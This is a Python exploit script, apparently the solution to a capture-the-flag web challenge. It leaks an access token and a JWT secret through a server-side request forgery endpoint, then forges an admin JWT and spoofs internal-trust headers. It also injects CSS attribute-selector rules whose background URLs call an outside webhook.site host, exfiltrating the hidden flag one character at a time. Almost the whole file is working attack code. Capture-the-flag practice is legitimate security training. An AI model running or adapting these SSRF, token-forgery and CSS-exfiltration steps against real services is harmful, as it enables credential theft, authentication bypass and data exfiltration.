import jwt
import requests
import time
import string
import json

# === Config ===



SECRET = "supersecret"
BASE_URL = "https://no-iu-no-cry-securinets.espark.tn"
SUBMIT_ENDPOINT = "/api/submit"
SSRF_ENDPOINT = "/api/leak-secret"

# Webhook info (replace with your live Webhook.site ID)
WEBHOOK_SITE_ID = "WEBHOOK-ID" #change it
WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_SITE_ID}"
WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_SITE_ID}/requests"

CHARSET = string.ascii_letters + string.digits + "{}_"
SLEEP = 0
MAX_FLAG_LENGTH = 50

# === STEP 1: Leak access token via SSRF to /internal/secret ===
print("[1] Leaking access token via SSRF...")

try:
    token_res = requests.get(
        BASE_URL + SSRF_ENDPOINT,
        params={
            "url": f"{BASE_URL}/internal/secret"
        }
    )
    access_token = token_res.json()["leakedData"]
    print(f"[‚úÖ] Access token leaked: {access_token}")
except Exception as e:
    print(f"[‚ùå] Failed to leak access token: {e}")
    exit(1)

# === STEP 2: Use access token to leak JWT secret via SSRF to /metadata ===
print("[2] Leaking JWT secret via SSRF...")

try:
    jwt_res = requests.get(
        BASE_URL + SSRF_ENDPOINT,
        params={
            "url": f"{BASE_URL}/metadata",
            "token": access_token
        }
    )
    
    leaked = jwt_res.json()["leakedData"]
    if isinstance(leaked, str):
        leaked = json.loads(leaked)  # parse string into dict if needed

    leaked_jwt_secret = leaked["jwt-secret"]
    leaked_internal_access = leaked["internal_secret"]
    print(f"[‚úÖ] JWT secret leaked: {leaked_jwt_secret}")
except Exception as e:
    print(f"[‚ùå] Failed to leak JWT secret: {e}")
    exit(1)

# === Generate Admin JWT with timestamp ===
def generate_admin_token():
    payload = {
        "name": "admin",
        "ts": int(time.time() * 1000)
    }
    return jwt.encode(payload, leaked_jwt_secret, algorithm="HS256")

# === Check webhook for leaked guess ===
def webhook_contains(needle):
    try:
        res = requests.get(WEBHOOK_API)
        if res.ok:
            for entry in res.json().get("data", []):
                if needle in entry.get("url", ""):
                    return True
    except Exception as e:
        print(f"[!] Webhook error: {e}")
    return False

# === Brute-force loop ===
known = "CCTF{"
print(f"[üîç] Starting from: {known}")
print(generate_admin_token())
while not known.endswith("}"):
    for ch in CHARSET:
        guess = known + ch
        print(f"[*] Trying: {guess}")

        css_payload = f'''
        #admin-panel[data-content^="{guess}"] {{
          background: url("{WEBHOOK_URL}?leak={guess}");
        }}
        '''

        token = generate_admin_token()
        headers = {
            "Authorization": f"`Bearer {token}`",
            "Content-Type": "application/json",
            "X-Trusted-User": "admin",
            "x-internal-access": f"{leaked_internal_access}",
            "User-Agent": "HeadlessChrome"
        }
        data = {
            "name": "attacker",
            "theme": css_payload
        }
        try:
            requests.post(BASE_URL + SUBMIT_ENDPOINT, headers=headers, json=data)
        except Exception as e:
            print(f"[!] Request failed: {e}")
            continue

        if webhook_contains(guess):
            print(f"[üéØ] Match: {guess}")
            known = guess
            break
    else:
        print("[‚ùå] No match found this round. Exiting.")
        break

print(f"[‚úÖ] Final Flag: {known}")
